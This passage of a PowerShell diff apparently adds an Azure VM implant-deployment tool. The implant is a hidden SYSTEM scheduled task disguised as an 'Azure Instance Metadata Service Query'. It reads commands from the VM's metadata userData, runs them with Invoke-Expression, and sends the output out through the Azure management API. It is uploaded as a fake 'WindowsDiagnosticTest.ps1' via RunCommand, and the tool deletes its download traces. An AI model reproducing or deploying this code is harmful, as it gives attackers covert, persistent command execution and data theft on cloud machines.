BzAGUAcgBJAGQAPgBTAC0AMQAtADUALQAxADgAPAAvAFUAcwBlAHIASQBkAD4ACgAgACAAIAAgACAAIAA8AFIAdQBuAEwAZQB2AGUAbAA+AEgAaQBnAGgAZQBzAHQAQQB2AGEAaQBsAGEAYgBsAGUAPAAvAFIAdQBuAEwAZQB2AGUAbAA+AAoAIAAgACAAIAA8AC8AUAByAGkAbgBjAGkAcABhAGwAPgAKACAAIAA8AC8AUAByAGkAbgBjAGkAcABhAGwAcwA+AAoAIAAgADwAUwBlAHQAdABpAG4AZwBzAD4ACgAgACAAIAAgADwATQB1AGwAdABpAHAAbABlAEkAbgBzAHQAYQBuAGMAZQBzAFAAbwBsAGkAYwB5AD4ASQBnAG4AbwByAGUATgBlAHcAPAAvAE0AdQBsAHQAaQBwAGwAZQBJAG4AcwB0AGEAbgBjAGUAcwBQAG8AbABpAGMAeQA+AAoAIAAgACAAIAA8AEQAaQBzAGEAbABsAG8AdwBTAHQAYQByAHQASQBmAE8AbgBCAGEAdAB0AGUAcgBpAGUAcwA+AHQAcgB1AGUAPAAvAEQAaQBzAGEAbABsAG8AdwBTAHQAYQByAHQASQBmAE8AbgBCAGEAdAB0AGUAcgBpAGUAcwA+AAoAIAAgACAAIAA8AFMAdABvAHAASQBmAEcAbwBpAG4AZwBPAG4AQgBhAHQAdABlAHIAaQBlAHMAPgB0AHIAdQBlADwALwBTAHQAbwBwAEkAZgBHAG8AaQBuAGcATwBuAEIAYQB0AHQAZQByAGkAZQBzAD4ACgAgACAAIAAgADwAQQBsAGwAbwB3AEgAYQByAGQAVABlAHIAbQBpAG4AYQB0AGUAPgB0AHIAdQBlADwALwBBAGwAbABvAHcASABhAHIAZABUAGUAcgBtAGkAbgBhAHQAZQA+AAoAIAAgACAAIAA8AFMAdABhAHIAdABXAGgAZQBuAEEAdgBhAGkAbABhAGIAbABlAD4AZgBhAGwAcwBlADwALwBTAHQAYQByAHQAVwBoAGUAbgBBAHYAYQBpAGwAYQBiAGwAZQA+AAoAIAAgACAAIAA8AFIAdQBuAE8AbgBsAHkASQBmAE4AZQB0AHcAbwByAGsAQQB2AGEAaQBsAGEAYgBsAGUAPgBmAGEAbABzAGUAPAAvAFIAdQBuAE8AbgBsAHkASQBmAE4AZQB0AHcAbwByAGsAQQB2AGEAaQBsAGEAYgBsAGUAPgAKACAAIAAgACAAPABJAGQAbABlAFMAZQB0AHQAaQBuAGcAcwA+AAoAIAAgACAAIAAgACAAPABTAHQAbwBwAE8AbgBJAGQAbABlAEUAbgBkAD4AdAByAHUAZQA8AC8AUwB0AG8AcABPAG4ASQBkAGwAZQBFAG4AZAA+AAoAIAAgACAAIAAgACAAPABSAGUAcwB0AGEAcgB0AE8AbgBJAGQAbABlAD4AZgBhAGwAcwBlADwALwBSAGUAcwB0AGEAcgB0AE8AbgBJAGQAbABlAD4ACgAgACAAIAAgADwALwBJAGQAbABlAFMAZQB0AHQAaQBuAGcAcwA+AAoAIAAgACAAIAA8AEEAbABsAG8AdwBTAHQAYQByAHQATwBuAEQAZQBtAGEAbgBkAD4AdAByAHUAZQA8AC8AQQBsAGwAbwB3AFMAdABhAHIAdABPAG4ARABlAG0AYQBuAGQAPgAKACAAIAAgACAAPABFAG4AYQBiAGwAZQBkAD4AdAByAHUAZQA8AC8ARQBuAGEAYgBsAGUAZAA+AAoAIAAgACAAIAA8AEgAaQBkAGQAZQBuAD4AdAByAHUAZQA8AC8ASABpAGQAZABlAG4APgAKACAAIAAgACAAPABSAHUAbgBPAG4AbAB5AEkAZgBJAGQAbABlAD4AZgBhAGwAcwBlADwALwBSAHUAbgBPAG4AbAB5AEkAZgBJAGQAbABlAD4ACgAgACAAIAAgADwARABpAHMAYQBsAGwAbwB3AFMAdABhAHIAdABPAG4AUgBlAG0AbwB0AGUAQQBwAHAAUwBlAHMAcwBpAG8AbgA+AGYAYQBsAHMAZQA8AC8ARABpAHMAYQBsAGwAbwB3AFMAdABhAHIAdABPAG4AUgBlAG0AbwB0AGUAQQBwAHAAUwBlAHMAcwBpAG8AbgA+AAoAIAAgACAAIAA8AFUAcwBlAFUAbgBpAGYAaQBlAGQAUwBjAGgAZQBkAHUAbABpAG4AZwBFAG4AZwBpAG4AZQA+AHQAcgB1AGUAPAAvAFUAcwBlAFUAbgBpAGYAaQBlAGQAUwBjAGgAZQBkAHUAbABpAG4AZwBFAG4AZwBpAG4AZQA+AAoAIAAgACAAIAA8AFcAYQBrAGUAVABvAFIAdQBuAD4AZgBhAGwAcwBlADwALwBXAGEAawBlAFQAbwBSAHUAbgA+AAoAIAAgACAAIAA8AEUAeABlAGMAdQB0AGkAbwBuAFQAaQBtAGUATABpAG0AaQB0AD4AUABUADcAMgBIADwALwBFAHgAZQBjAHUAdABpAG8AbgBUAGkAbQBlAEwAaQBtAGkAdAA+AAoAIAAgACAAIAA8AFAAcgBpAG8AcgBpAHQAeQA+ADcAPAAvAFAAcgBpAG8AcgBpAHQAeQA+AAoAIAAgADwALwBTAGUAdAB0AGkAbgBnAHMAPgAKACAAIAA8AEEAYwB0AGkAbwBuAHMAIABDAG8AbgB0AGUAeAB0AD0AIgBBAHUAdABoAG8AcgAiAD4ACgAgACAAIAAgADwARQB4AGUAYwA+AAoAIAAgACAAIAAgACAAPABDAG8AbQBtAGEAbgBkAD4AcABvAHcAZQByAHMAaABlAGwAbAA8AC8AQwBvAG0AbQBhAG4AZAA+AAoAIAAgACAAIAAgACAAPABBAHIAZwB1AG0AZQBuAHQAcwA+ACIAQwA6AFwAVwBpAG4AZABvAHcAcwBBAHoAdQByAGUAXABQAGEAYwBrAGEAZwBlAHMAXABHAHUAZQBzAHQAQQBnAGUAbgB0AFwAQQB6AHUAcgBlAEkAbgBzAHQAYQBuAGMAZQBNAGUAdABhAGQAYQB0AGEAUwBlAHIAdgBpAGMAZQAuAHAAcwAxACIAPAAvAEEAcgBnAHUAbQBlAG4AdABzAD4ACgAgACAAIAAgADwALwBFAHgAZQBjAD4ACgAgACAAPAAvAEEAYwB0AGkAbwBuAHMAPgAKADwALwBUAGEAcwBrAD4A
+'
+$Check = Get-ScheduledTask -TaskName 'Azure Instance Metadata Service Query'
+If(!$Check){$xml = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($task))
+Register-ScheduledTask -TaskName 'Azure Instance Metadata Service Query' -Xml $xml
+Start-ScheduledTask -TaskName 'Azure Instance Metadata Service Query'}
+$AIMSData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET  -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+$UserData = $AIMSData.compute.userdata
+$B64D = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($userdata))
+$split = $B64D.Split('%')
+$Headers = @{}
+$Headers.Add("Authorization","Bearer"+ " " + "$($split[1])") 
+$data = Invoke-Expression $split[0] | out-string
+If($split[1]){
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($data)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$json = '{"properties": { "userData": ' + '"' + $EncodedText + '",	}}'
+$Uri = 'https://management.azure.com/' + $split[2] + '?api-version=2021-07-01'
+$RestMethod = Invoke-RestMethod -Method PATCH -Uri $uri -Body $Json -Header $Headers -ContentType 'application/json'}
+rm C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.9\Downloads\*
+'@
+	$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $data
+	$path = $new.DirectoryName + '\' + $new.Name 
+	Write-Host "Uploading Agent..." -ForegroundColor Yellow
+	$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
+	If($change){
+		Write-Host "Agent successfully deployed!" -Foregroundcolor Green
+	}
+	rm $path
 }
